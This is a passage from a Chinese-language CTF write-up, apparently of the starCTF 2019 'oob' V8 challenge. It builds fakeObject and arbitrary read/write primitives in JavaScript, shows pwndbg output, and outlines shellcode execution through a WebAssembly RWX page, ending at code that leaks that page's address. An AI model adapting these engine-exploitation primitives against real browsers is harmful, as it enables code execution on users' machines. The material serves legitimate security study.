<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将某个addr强制转换为object对象</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeObject</span>(<span class="params">addr_to_fake</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float_array[<span class="number">0</span>] = i2f(addr_to_fake + <span class="number">1n</span>);				<span class="comment">//将地址+1转变为对象</span></span><br><span class="line">    float_array.oob(obj_array_map);						   <span class="comment">//将float数组的头替换为对象数组的头</span></span><br><span class="line">    <span class="keyword">let</span> faked_obj = float_array[<span class="number">0</span>];						   <span class="comment">//将对象变量返回</span></span><br><span class="line">    float_array.oob(float_array_map); 					   <span class="comment">// 还原array类型以便后续继续使用</span></span><br><span class="line">    <span class="keyword">return</span> faked_obj;									 <span class="comment">//返回的是个对象</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>定义一些gadget，简单的工具代码</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ××××××××1. 无符号64位整数和64位浮点数的转换代码××××××××</span></span><br><span class="line"><span class="keyword">var</span> buf =<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> <span class="built_in">BigUint64Array</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 浮点数转换为64位无符号整数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">f</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为浮点数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为16进制字节串</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> i.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">%DebugPrint(float64);</span><br><span class="line">%DebugPrint(bigUint64);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>

<h2 id="5、构造任意读写原语"><a href="#5、构造任意读写原语" class="headerlink" title="5、构造任意读写原语"></a>5、构造任意读写原语</h2><p>上面已经将地址转对象和对象转地址的原语构造出来了，现在我们需要利用这两个原语来构造任意地址读写</p>
<p>我们现在有如下的思路：</p>
<p>1、fakeObject可以将给定的内存地址转变为object，我们可以在这块地址上面构造object的结构体，然后利用fakeObject将其转化为object</p>
<p>2、由于这块object完全是我们构造的，所以其中的任何字段都是我们可控的，包括elements字段</p>
<p>3、我们已经知道elements实际上是个指针，指向elements这个object对象的地址，当我们操作数组元素时，其实操作的就是从elements对象地址+0x10的内存，我们有这样一个思路：将elements位置处的值覆盖为任意地址，这样我们操作数组元素时，操作的就是这块写的任意地址的内存。</p>
<p>我们直接通过任意读写原语来具体说明下上述过程</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fake_array = [											 	 <span class="comment">// [+0x40]</span></span><br><span class="line">    float_array_map,</span><br><span class="line">    i2f(<span class="number">0n</span>),</span><br><span class="line">    i2f(<span class="number">0x41414141n</span>),</span><br><span class="line">    i2f(<span class="number">0x1000000000n</span>),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">    <span class="number">2.2</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_array_addr = addressOf(fake_array);						<span class="comment">// +0x40</span></span><br><span class="line"><span class="keyword">var</span> fake_object_addr = fake_array_addr - <span class="number">0x40n</span> + <span class="number">0x10n</span>;				 <span class="comment">// +0x10</span></span><br><span class="line"><span class="keyword">var</span> fake_object = fakeObject(fake_object_addr);						<span class="comment">// [+0x10]</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">addr</span>)											  </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);						<span class="comment">//fake_array[2] == [[+0x40+0x10]+0x10+0x10] == 0x00+0x10+0x10 == 0x20, +0x40++0x10为element的地址，[+0x40+0x10]为element对象，第一个+0x10为element的第[0]个元素，第二个+0x10为element的第[2]个元素,该地址存放的值为i2f(addr - 0x10n + 0x1n)。</span></span><br><span class="line">    <span class="keyword">let</span> leak_data = f2i(fake_object[<span class="number">0</span>]);							<span class="comment">//fake_object[0] == [[+0x10+0x10]+0x10] == [[+0x20]+0x10] == [addr-0x10+0x1+0x10] == [addr+0x1]</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] leak from: 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(leak_data));</span><br><span class="line">    <span class="keyword">return</span> leak_data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64</span>(<span class="params">addr, data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);						</span><br><span class="line">    fake_object[<span class="number">0</span>] = i2f(data);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] write to : 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(data));    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>描述下上面创建的具体的内存结构</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">+<span class="number">0x0</span>	elements_map		    <span class="comment">//elements_start</span></span><br><span class="line">+<span class="number">0x8</span>	elements_length</span><br><span class="line">+<span class="number">0x10</span>	float_array_map			<span class="comment">//fake_array[0]; fake_object_addr</span></span><br><span class="line">+<span class="number">0x18</span> 	<span class="built_in">i2f</span>(<span class="number">0</span>n)				    <span class="comment">//fake_array[1]</span></span><br><span class="line">+<span class="number">0x20</span>	<span class="built_in">i2f</span>(<span class="number">0x41414141</span>n)		<span class="comment">//fake_array[2]			//elements对象</span></span><br><span class="line">+<span class="number">0x28</span>	<span class="built_in">i2f</span>(<span class="number">0x1000000000</span>n)		<span class="comment">//fake_array[3]</span></span><br><span class="line">+<span class="number">0x30</span>	<span class="number">1.1</span>					   <span class="comment">//fake_array[4]</span></span><br><span class="line">+<span class="number">0x38</span>	<span class="number">2.2</span>					   <span class="comment">//fake_array[5]</span></span><br><span class="line">+<span class="number">0x40</span>	map					   <span class="comment">//fake_array_addr</span></span><br><span class="line">+<span class="number">0x48</span>	prototype</span><br><span class="line">+<span class="number">0x50</span>	elements				<span class="comment">//value == +0x0</span></span><br><span class="line">+<span class="number">0x58</span>	length</span><br><span class="line">+<span class="number">0x60</span>	properties</span><br></pre></td></tr></table></figure>

<p>然后在v8中进行调试</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line"><span class="keyword">var</span> a_addr = addressOf(a);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] addressOf a: 0x&quot;</span> + hex(a_addr));</span><br><span class="line"></span><br><span class="line">read64(a_addr);</span><br><span class="line">%SystemBreak();</span><br><span class="line"></span><br><span class="line">write64(a_addr, <span class="number">0x01020304n</span>);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>

<p>输出结果如下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; r</span><br><span class="line">...</span><br><span class="line"><span class="number">0x1f8b3558fa61</span> &lt;JSArray[<span class="number">3</span>]&gt;</span><br><span class="line">[*] addressOf a: <span class="number">0x00001f8b3558fa60</span></span><br><span class="line">[*] leak from: <span class="number">0x00001f8b3558fa60</span>: <span class="number">0x00003f510acc2ed9</span></span><br><span class="line">...</span><br><span class="line">pwndbg&gt; telescope <span class="number">0x00001f8b3558fa60</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│   <span class="number">0x1f8b3558fa60</span> —▸ <span class="number">0x3f510acc2ed9</span> ◂— <span class="number">0x4000001989b3c01</span>			<span class="comment">//可以看到将0x1f8b3558fa60处的值0x3f510acc2ed9读取出来了</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│   <span class="number">0x1f8b3558fa68</span> —▸ <span class="number">0x1989b3c0c71</span> ◂— <span class="number">0x1989b3c08</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│   <span class="number">0x1f8b3558fa70</span> —▸ <span class="number">0x1f8b3558fa39</span> ◂— <span class="number">0x1989b3c14</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│   <span class="number">0x1f8b3558fa78</span> ◂— <span class="number">0x300000000</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│   <span class="number">0x1f8b3558fa80</span> —▸ <span class="number">0x1989b3c0561</span> ◂— <span class="number">0x2000001989b3c01</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│   <span class="number">0x1f8b3558fa88</span> —▸ <span class="number">0x1f8b3558fa61</span> ◂— <span class="number">0x7100003f510acc2e</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│   <span class="number">0x1f8b3558fa90</span> —▸ <span class="number">0x1989b3c13b9</span> ◂— <span class="number">0x1989b3c01</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│   <span class="number">0x1f8b3558fa98</span> ◂— <span class="number">0x2</span></span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">[*] write to : <span class="number">0x00001f8b3558fa60</span>: <span class="number">0x0000000001020304</span></span><br><span class="line">...</span><br><span class="line">pwndbg&gt; telescope <span class="number">0x00001f8b3558fa60</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│   <span class="number">0x1f8b3558fa60</span> ◂— <span class="number">0x1020304</span>									<span class="comment">//0x1f8b3558fa60处的值被修改为0x0000000001020304</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│   <span class="number">0x1f8b3558fa68</span> —▸ <span class="number">0x1989b3c0c71</span> ◂— <span class="number">0x1989b3c08</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│   <span class="number">0x1f8b3558fa70</span> —▸ <span class="number">0x1f8b3558fa39</span> ◂— <span class="number">0x1989b3c14</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│   <span class="number">0x1f8b3558fa78</span> ◂— <span class="number">0x300000000</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│   <span class="number">0x1f8b3558fa80</span> —▸ <span class="number">0x1989b3c0561</span> ◂— <span class="number">0x2000001989b3c01</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│   <span class="number">0x1f8b3558fa88</span> —▸ <span class="number">0x1f8b3558fa61</span> ◂— <span class="number">0x7100000000010203</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│   <span class="number">0x1f8b3558fa90</span> —▸ <span class="number">0x1989b3c13b9</span> ◂— <span class="number">0x1989b3c01</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│   <span class="number">0x1f8b3558fa98</span> ◂— <span class="number">0x2</span>    </span><br></pre></td></tr></table></figure>

<h2 id="6、利用思路归纳"><a href="#6、利用思路归纳" class="headerlink" title="6、利用思路归纳"></a>6、利用思路归纳</h2><p>题目的利用思路有两种，一种是通过常规的堆漏洞利用方式，另一种是js引擎漏洞特有的义中叫做wasm的利用方式</p>
<p>在传统堆漏洞的pwn中，利用过程如下（因为在我们的浏览器中，已经实现了任意地址读写的漏洞效果，所以这个传统的利用思路在v8中也同样适用）</p>
<blockquote>
<p>通过堆漏洞能够实现一个任意地址写的效果</p>
<p>结合程序功能和UAF漏洞泄露出一个libc地址</p>
<p>通过泄露的libc地址计算出free_hook、malloc_hook、system和one_gadget的内存地址</p>
<p>利用任意地址写将hook函数修改为System或one_gadget的地址，从而实现shell的执行</p>
</blockquote>
<p>另外在v8中还有一种被称为webassembly即wasm的技术。通俗来讲，v8可以直接执行其它高级语言生成的机器码，从而加快运行效率。存储wasm的内存页是RWX可读可写可执行的，因此我们还可以通过下面的思路执行我们的shellcode：</p>
<blockquote>
<p>利用webassembly构造一块RWX内存页</p>
<p>通过漏洞将shellcode覆写到原本属于webassembly机器码的内存页中</p>
<p>后续再调用webassembly函数接口时，实际上就触发了我们部署好的shellcode</p>
</blockquote>
<p>wasm详细见下面的文章，讲的很好：</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://www.jianshu.com/p/bff8aa23fe4d" >https://www.jianshu.com/p/bff8aa23fe4d<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="7、WASM方式进行漏洞利用"><a href="#7、WASM方式进行漏洞利用" class="headerlink" title="7、WASM方式进行漏洞利用"></a>7、WASM方式进行漏洞利用</h2><h3 id="简单用法"><a href="#简单用法" class="headerlink" title="简单用法"></a>简单用法</h3><p>wasm即webassembly，可以让JavaScript直接执行高级语言生成的机器码。</p>
<p>在线编译网站：<a class="link"   target="_blank" rel="noopener" href="https://wasdk.github.io/WasmFiddle/" >https://wasdk.github.io/WasmFiddle/<i class="fas fa-external-link-alt"></i></a></p>
<p>可以直接通过示例来进行，点击左下角选择Code Buffer，之后正上方build，之后正上方run，之后右下方就会显示出执行结果：</p>
<p><img src="/2021/04/21/starctf2019-oob/image-20210104145616327.png" alt="image-20210104145616327"></p>
<p>这样有种猜测，是不是可以直接写调用命令，直接转换为WASM码，js引擎直接执行，后来发现这种方式是不行的，报告脚本错误</p>
<p><img src="/2021/04/21/starctf2019-oob/image-20210104150202512.png" alt="image-20210104150202512"></p>
<h3 id="利用wasm执行shellcode"><a href="#利用wasm执行shellcode" class="headerlink" title="利用wasm执行shellcode"></a>利用wasm执行shellcode</h3><p>wasm的作用是将一段功能转换为机器码，实际上wasm是一段AST字节码，之后通过运行wasm这一段字节码将高级语言转换为机器码，也就是说，wasm的功能可以理解为编译功能，wasm的代码和它”编译“生成的机器码的位置是不一样的</p>
<p>所以我们有这样的一种方式：</p>
<p>1、首先通过wasm生成一段tmpcode</p>
<p>2、通过addressOf原语找到存放wasm的内存地址</p>
<p>3、通过任意地址写原语用shellcode替换原本的tmpcode</p>
<p>4、最后调用之前的tmpcode功能即可触发shellcode</p>
<p>寻找</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /root/browser_study/v8/v8/v8/out/x64.release/d8 --allow-natives-syntax ./poc.js</span><br><span class="line">...</span><br><span class="line">[*] leak wasm func addr: <span class="number">0x000005b5f06a1b60</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; job <span class="number">0x000005b5f06a1b61</span></span><br><span class="line"><span class="number">0x5b5f06a1b61</span>: [Function] in OldSpace</span><br><span class="line"> - map: <span class="number">0x02b1b4a04379</span> &lt;<span class="built_in">Map</span>(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x05b5f0682109</span> &lt;<span class="built_in">JSFunction</span> (sfi = <span class="number">0x146242243b29</span>)&gt;</span><br><span class="line"> - elements: <span class="number">0x129784b00c71</span> &lt;FixedArray[<span class="number">0</span>]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - function prototype: &lt;no-prototype-slot&gt;</span><br><span class="line"> - shared_info: <span class="number">0x05b5f06a1b29</span> &lt;SharedFunctionInfo <span class="number">0</span>&gt;</span><br><span class="line"> - name: <span class="number">0x129784b04ae1</span> &lt;String[#<span class="number">1</span>]: <span class="number">0</span>&gt;</span><br><span class="line"> - formal_parameter_count: <span class="number">0</span></span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - context: <span class="number">0x05b5f0681869</span> &lt;NativeContext[<span class="number">246</span>]&gt;</span><br><span class="line"> - code: <span class="number">0x027534f82001</span> &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - WASM instance <span class="number">0x5b5f06a1969</span></span><br><span class="line"> - WASM function index <span class="number">0</span></span><br><span class="line"> - properties: <span class="number">0x129784b00c71</span> &lt;FixedArray[<span class="number">0</span>]&gt; &#123;</span><br><span class="line">    <span class="meta">#length: 0x1462422404b9 <span class="meta-string">&lt;AccessorInfo&gt;</span> (const accessor descriptor)</span></span><br><span class="line">    <span class="meta">#name: 0x146242240449 <span class="meta-string">&lt;AccessorInfo&gt;</span> (const accessor descriptor)</span></span><br><span class="line">    <span class="meta">#arguments: 0x146242240369 <span class="meta-string">&lt;AccessorInfo&gt;</span> (const accessor descriptor)</span></span><br><span class="line">    <span class="meta">#caller: 0x1462422403d9 <span class="meta-string">&lt;AccessorInfo&gt;</span> (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> - feedback vector: <span class="keyword">not</span> available</span><br><span class="line">pwndbg&gt; job <span class="number">0x05b5f06a1b29</span></span><br><span class="line"><span class="number">0x5b5f06a1b29</span>: [SharedFunctionInfo] in OldSpace</span><br><span class="line"> - map: <span class="number">0x129784b009e1</span> &lt;Map[<span class="number">56</span>]&gt;</span><br><span class="line"> - name: <span class="number">0x129784b04ae1</span> &lt;String[#<span class="number">1</span>]: <span class="number">0</span>&gt;</span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - function_map_index: <span class="number">144</span></span><br><span class="line"> - formal_parameter_count: <span class="number">0</span></span><br><span class="line"> - expected_nof_properties: <span class="number">0</span></span><br><span class="line"> - language_mode: sloppy</span><br><span class="line"> - data: <span class="number">0x05b5f06a1b01</span> &lt;WasmExportedFunctionData&gt;</span><br><span class="line"> - <span class="built_in">code</span> (from data): <span class="number">0x027534f82001</span> &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - function token position: <span class="number">-1</span></span><br><span class="line"> - start position: <span class="number">-1</span></span><br><span class="line"> - end position: <span class="number">-1</span></span><br><span class="line"> - no debug info</span><br><span class="line"> - scope info: <span class="number">0x129784b00c61</span> &lt;ScopeInfo[<span class="number">0</span>]&gt;</span><br><span class="line"> - length: <span class="number">0</span></span><br><span class="line"> - feedback_metadata: <span class="number">0x129784b02a39</span>: [FeedbackMetadata]</span><br><span class="line"> - map: <span class="number">0x129784b01319</span> &lt;Map&gt;</span><br><span class="line"> - slot_count: <span class="number">0</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; job <span class="number">0x05b5f06a1b01</span></span><br><span class="line"><span class="number">0x5b5f06a1b01</span>: [WasmExportedFunctionData] in OldSpace</span><br><span class="line"> - map: <span class="number">0x129784b05879</span> &lt;Map[<span class="number">40</span>]&gt;</span><br><span class="line"> - wrapper_code: <span class="number">0x027534f82001</span> &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - instance: <span class="number">0x05b5f06a1969</span> &lt;Instance map = <span class="number">0x2b1b4a09789</span>&gt;</span><br><span class="line"> - function_index: <span class="number">0</span></span><br><span class="line">pwndbg&gt; job <span class="number">0x05b5f06a1969</span></span><br><span class="line"><span class="number">0x5b5f06a1969</span>: [WasmInstanceObject] in OldSpace</span><br><span class="line"> - map: <span class="number">0x02b1b4a09789</span> &lt;<span class="built_in">Map</span>(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x031ac750ac19</span> &lt;Object map = <span class="number">0x2b1b4a0ac79</span>&gt;</span><br><span class="line"> - elements: <span class="number">0x129784b00c71</span> &lt;FixedArray[<span class="number">0</span>]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - module_object: <span class="number">0x031ac75101e1</span> &lt;Module map = <span class="number">0x2b1b4a091e9</span>&gt;</span><br><span class="line"> - exports_object: <span class="number">0x031ac7510451</span> &lt;Object map = <span class="number">0x2b1b4a0adb9</span>&gt;</span><br><span class="line"> - native_context: <span class="number">0x05b5f0681869</span> &lt;NativeContext[<span class="number">246</span>]&gt;</span><br><span class="line"> - memory_object: <span class="number">0x05b5f06a1a91</span> &lt;Memory map = <span class="number">0x2b1b4a0a189</span>&gt;</span><br><span class="line"> - table <span class="number">0</span>: <span class="number">0x031ac75103e9</span> &lt;Table map = <span class="number">0x2b1b4a09aa9</span>&gt;</span><br><span class="line"> - imported_function_refs: <span class="number">0x129784b00c71</span> &lt;FixedArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - managed_native_allocations: <span class="number">0x031ac7510391</span> &lt;Foreign&gt;</span><br><span class="line"> - memory_start: <span class="number">0x7f9336540000</span></span><br><span class="line"> - memory_size: <span class="number">65536</span></span><br><span class="line"> - memory_mask: ffff</span><br><span class="line"> - imported_function_targets: <span class="number">0x55977a6fa3f0</span></span><br><span class="line"> - globals_start: (nil)</span><br><span class="line"> - imported_mutable_globals: <span class="number">0x55977a6f9fd0</span></span><br><span class="line"> - indirect_function_table_size: <span class="number">0</span></span><br><span class="line"> - indirect_function_table_sig_ids: (nil)</span><br><span class="line"> - indirect_function_table_targets: (nil)</span><br><span class="line"> - properties: <span class="number">0x129784b00c71</span> &lt;FixedArray[<span class="number">0</span>]&gt; &#123;&#125;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x05b5f06a1968</span>+<span class="number">0x88</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│   <span class="number">0x5b5f06a19f0</span> —▸ <span class="number">0x20bf51557000</span> ◂— movabs r10, <span class="number">0x20bf51557260</span> <span class="comment">/* 0x20bf51557260ba49 */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│   <span class="number">0x5b5f06a19f8</span> —▸ <span class="number">0x31ac75101e1</span> ◂— <span class="number">0x71000002b1b4a091</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│   <span class="number">0x5b5f06a1a00</span> —▸ <span class="number">0x31ac7510451</span> ◂— <span class="number">0x71000002b1b4a0ad</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│   <span class="number">0x5b5f06a1a08</span> —▸ <span class="number">0x5b5f0681869</span> ◂— <span class="number">0x129784b00f</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│   <span class="number">0x5b5f06a1a10</span> —▸ <span class="number">0x5b5f06a1a91</span> ◂— <span class="number">0x71000002b1b4a0a1</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│   <span class="number">0x5b5f06a1a18</span> —▸ <span class="number">0x129784b004d1</span> ◂— <span class="number">0x129784b005</span></span><br><span class="line">... ↓</span><br><span class="line">pwndbg&gt; vmmap <span class="number">0x20bf51557000</span></span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    <span class="number">0x20bf51557000</span>     <span class="number">0x20bf51558000</span> rwxp     <span class="number">1000</span> <span class="number">0</span>       +<span class="number">0x0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>根据上面的思路，写出泄露RWX内存页起始地址的JS代码如下所示：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> shared_info_addr = read64(f_addr + <span class="number">0x18n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_exported_func_data_addr = read64(shared_info_addr + <span class="number">0x8n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_instance_addr = read64(wasm_exported_func_data_addr + <span class="number">0x10n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> rwx_page_addr = read64(wasm_instance_addr + <span class="number">0x88n</span>);					<span class="comment">//这里面的偏移在不同版本的v8中可能不同，不过只要在调试的过程中按照Function--&gt;shared_info--&gt;WasmExportedFunctionData--&gt;instance的调用关系确定偏移，最后telescope查看instance的内存就好了</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] leak rwx_page_addr: 0x&quot;</span> + hex(rwx_page_addr));</span><br></pre></td></tr></table></figure>

<p>gdb结果如下</p>
